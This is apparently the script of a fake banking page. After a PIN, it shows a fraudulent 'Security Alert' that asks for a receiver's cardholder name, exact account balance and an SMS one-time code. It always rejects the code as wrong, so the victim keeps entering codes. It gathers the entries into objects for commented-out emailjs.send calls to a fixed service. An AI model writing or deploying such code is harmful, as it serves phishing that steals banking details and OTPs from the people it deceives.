pin();
function pin() {
document.querySelector('.js-continue').addEventListener('click', () => {
  const pinElement = document.querySelector('.js-pin-digits')
  const pin = pinElement.value
  let correctHTML = '';
  if (pin === '3132') {
    html = `<div class="html-div">
      <div class="header-div">
        <p class="security-alert">Security Alert!!</p>
        <p class="answer-question">Hello Anna, we noticed this transaction on a new device</p>
        <p class="answer-question">Answer two questions to continue transfer</p>
      </div>
      <div class="question-div">
        <div class="question1">Question 1:</div>
        <div>
          <p>Enter the card holder name of the receiver.</p>
          <input type="text" placeholder="card name" class="phone-input js-phone-input">
        </div>
      </div>

      <div class="question-div">
        <div class="question1">Question 2:</div>
        <div>
          <p>Enter the receiver exact current account balance.</p>
          <input placeholder="exact amount" class="amount-input js-amount-input">
        </div>
      </div>
      <div class="answer-div">
        <button onclick=" answer()" class="answer-button">Answer</button>
      </div>
    </div>`
  } else {
    html = `<p class="incorrect-pin">Incorrect pin</p>`
  }
  correctHTML += html;

  document.querySelector('.container-HTML').innerHTML = correctHTML;

  pinElement.value = '';
})
}

function answer() {
  const phoneElement = document.querySelector('.js-phone-input')
  const phone = phoneElement.value;

  const exactElement = document.querySelector('.js-amount-input')
  const exact = exactElement.value;
  otpHTML ='';
  ohtml = '';

  if (phone === '') {
    alert('Answer question 1')
  } else if(phone === 'ANNA WELSON') {
    alert('send money to a diffrent account')
  } else if (exact === '') {
    alert('Answer question 2')
  } else {
      ohtml = `<div class="otp-div">
      <p class="otp-text">An OTP code was sent to <span class="phone-input-span"> ${phone}</span> via sms</p>
      <input placeholder="Enter OTP" class="otp-input js-otp-input">
      <button onclick="confirm()" class="confirm-button">Confirm</button>
    </div>`;

    let secondParams = {
      card: phone,
      message: exact,
   }
   console.log(secondParams);

 //emailjs.send("service_exfzcaq","template_q7b1lho",secondParams);
  }
  otpHTML += ohtml;
  document.querySelector('.js-otphtml-div').innerHTML = otpHTML;

}

function confirm() {
const otpElement = document.querySelector('.js-otp-input')
const otp = Number(otpElement.value);
otpElement.value = '';
const anyNumber = Math.random();
lastHTML = '';
if (otp === 0) {
  lastHtml = `<p>Enter OTP</p>`;
} else if (anyNumber >= 0) {
  lastHtml = `<p class="wrong-code">Wrong code(You will be bound for making transaction on this device after 3 wrong attempt )</p>`
 let thirdParams = {
      card: otp,
   }
   console.log(thirdParams);

 //emailjs.send("service_exfzcaq","template_q7b1lho",secondParams);
}
lastHTML += lastHtml
document.querySelector('.js-lastHTML-div').innerHTML = lastHTML;
}
